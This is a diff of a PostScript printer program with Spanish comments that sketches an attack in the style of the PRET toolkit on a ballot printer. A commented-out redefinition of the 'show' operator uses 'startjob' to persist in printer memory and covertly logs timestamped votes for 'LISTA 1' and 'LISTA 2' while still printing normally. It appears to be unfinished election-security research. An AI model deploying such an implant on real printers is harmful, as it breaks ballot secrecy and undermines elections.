@@ -17,7 +17,7 @@ true 0 startjob pop
 } bind def
 
 /arraymap {
-  [ 2 index 3 2 roll forall ] exch pop
+  [ 3 1 roll forall ]
 } bind def
 
 %robado de https://en.wikibooks.org/wiki/PostScript_FAQ#How_to_concatenate_strings.3F
@@ -38,7 +38,7 @@ true 0 startjob pop
     (%Calendar%) currentdevparams
     dup /DateTime known
     { /DateTime get }
-    { [ exch
+    { [ exch 
         /Day getbehind (/) exch /Month getbehind (/) exch /Year getbehind
         ( ) exch
         /Hour getbehind (:) exch /Minute getbehind (:) exch /Second get
@@ -59,25 +59,37 @@ true 0 startjob pop
 
 /sumarvoto {
   % Tiene que tomar la fecha y hora, la lista y agregarla al array de votos
-  dup [ exch ahoramesmo ] % creo el voto
+  [ exch ahoramesmo ] % creo el voto
   pushvoto % lo agrego a la lista
 } def
 
-% Al redefinir `showpage` hay que poner un valor magico para triggerear las acciones
-%/lista1 (PABLO LESCANO) def
-%/lista2 (MALAFAMA) def
-% Podría agregarse algo así a showpage
-% se tiene que construir un ataque similar al de https://github.com/RUB-NDS/PRET
-% los cambios no son duraderos dentro del job, así que tendría que imprimir y LUEGO
-% ejecutar el código de voto
-%/showpage {
-%  count 0 gt { % Si hay algo en el stack
-%    dup        % Lo duplico por las dudas
-%    lista1 eq { sumarvoto } if % Si es la lista uno sumo el voto
-%    dup
-%    lista2 eq { sumarvoto } if % Si es la lista dos sumo el voto
-%  } if
-%  systemdict /showpage get exec
+%/realshow systemdict /show get def
+% TODO: Hacer este codigo mas legible
+% SI ES (LISTA 1) lo cuento
+% SINO pero ES (LISTA 2) lo cuento
+% SINO ejectuto show
+%/show {
+%  dup (LISTA 1) eq {
+%    % Sumo el voto y acomodo la impresion
+%    true 0 startjob pop
+%      userdict /votos known { (LISTA 1 - FACIL Y RAPIDO) sumarvoto } if
+%    false 0 startjob pop
+%    90 rotate
+%    /Helvetica findfont 72 scalefont setfont
+%    20 -20 72 sub moveto
+%    (LISTA 1) realshow
+%   } {
+%    dup (LISTA 2) eq {
+%      % Sumo el voto y acomodo la impresion
+%      true 0 startjob pop
+%        userdict /votos known { (LISTA 2 - ILUSIONISTAS INFORMATICOS) sumarvoto } if
+%      false 0 startjob pop
+%      90 rotate
+%      /Helvetica findfont 72 scalefont setfont
+%      20 -20 72 sub moveto
+%      (LISTA 2) realshow
+%    } { realshow } ifelse
+%  } ifelse
 %} def
 
 % Imprimo algo
